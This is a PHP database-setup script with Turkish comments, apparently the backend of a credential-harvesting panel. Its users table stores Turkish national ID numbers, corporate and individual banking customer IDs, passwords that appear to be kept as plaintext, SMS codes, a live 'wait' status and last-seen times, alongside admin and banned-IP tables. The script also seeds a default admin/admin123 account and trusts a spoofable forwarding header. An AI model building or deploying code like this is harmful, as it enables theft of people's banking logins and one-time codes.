<?php
// Railway ve Localhost uyumlu veritabanı bağlantısı
$servername = getenv('MYSQLHOST') ?: (getenv('DB_HOST') ?: "localhost");
$username = getenv('MYSQLUSER') ?: (getenv('DB_USER') ?: "root");
$password = getenv('MYSQLPASSWORD') ?: (getenv('DB_PASS') ?: "");
$dbname = getenv('MYSQLDATABASE') ?: (getenv('DB_NAME') ?: "zrt");
$port = getenv('MYSQLPORT') ?: (getenv('DB_PORT') ?: 3306);

// Railway Proxy IP Düzeltmesi (Gerçek kullanıcı IP'sini almak için)
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $_SERVER['REMOTE_ADDR'] = trim($ip_list[0]);
} elseif (isset($_SERVER['HTTP_X_REAL_IP'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_REAL_IP'];
}

// Eğer MYSQL_URL veya DATABASE_URL varsa onu ayrıştır (Railway fallback)
$db_url = getenv('MYSQL_URL') ?: getenv('DATABASE_URL');
if ($db_url) {
    $parsed_url = parse_url($db_url);
    if ($parsed_url) {
        $servername = $parsed_url['host'] ?? $servername;
        $username = $parsed_url['user'] ?? $username;
        $password = $parsed_url['pass'] ?? $password;
        $dbname = ltrim($parsed_url['path'] ?? '/'.$dbname, '/');
        $port = $parsed_url['port'] ?? $port;
    }
}

// Hata raporlamayı açalım ki 502'nin sebebini görebilelim
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);

try {
    // Önce doğrudan veritabanına bağlanmayı dene (Railway vb. ortamlar için)
    $conn = new mysqli($servername, $username, $password, $dbname, $port);
} catch (mysqli_sql_exception $e) {
    // Eğer doğrudan bağlanılamazsa (örn: localhostta veritabanı henüz yoksa)
    try {
        // Veritabanı adı olmadan sunucuya bağlan
        $conn = new mysqli($servername, $username, $password, "", $port);
        
        // Veritabanını oluştur
        $sql = "CREATE DATABASE IF NOT EXISTS `$dbname` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci";
        $conn->query($sql);
        
        // Veritabanını seç
        $conn->select_db($dbname);
    } catch (mysqli_sql_exception $e2) {
        // Bağlantı tamamen başarısız olursa 502 yerine anlamlı bir hata mesajı ver
        http_response_code(500);
        die("Veritabanı Bağlantı Hatası: " . $e2->getMessage() . " | Lütfen Railway değişkenlerinin (MYSQLHOST vb.) doğru bağlandığından emin olun.");
    }
}

// Tabloyu oluştur (eğer yoksa)
$sql_users = "CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(50) NULL,
    tc_kimlik VARCHAR(50) NULL,
    kurumsal_id VARCHAR(50) NULL,
    bireysel_id VARCHAR(50) NULL,
    sifre VARCHAR(50) NOT NULL DEFAULT '',
    giris_tipi VARCHAR(20) NOT NULL DEFAULT 'bilinmiyor',
    status VARCHAR(50) NOT NULL DEFAULT 'bekle',
    last_seen INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
$conn->query($sql_users);

// Ensure sms_code column exists
$conn->query("ALTER TABLE users ADD COLUMN IF NOT EXISTS sms_code VARCHAR(50) NULL");

// Admin tablosunu oluştur
$sql_admins = "CREATE TABLE IF NOT EXISTS admins (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
$conn->query($sql_admins);

// Banlı IP'ler tablosunu oluştur
$sql_banned = "CREATE TABLE IF NOT EXISTS banned_ips (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(50) NOT NULL UNIQUE,
    banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
$conn->query($sql_banned);

// Varsayılan admin hesabını oluştur (şifre: admin123)
$result = $conn->query("SELECT COUNT(*) as count FROM admins");
$row = $result->fetch_assoc();
if ($row['count'] == 0) {
    $default_password = password_hash('admin123', PASSWORD_DEFAULT);
    $conn->query("INSERT INTO admins (username, password) VALUES ('admin', '$default_password')");
}
?>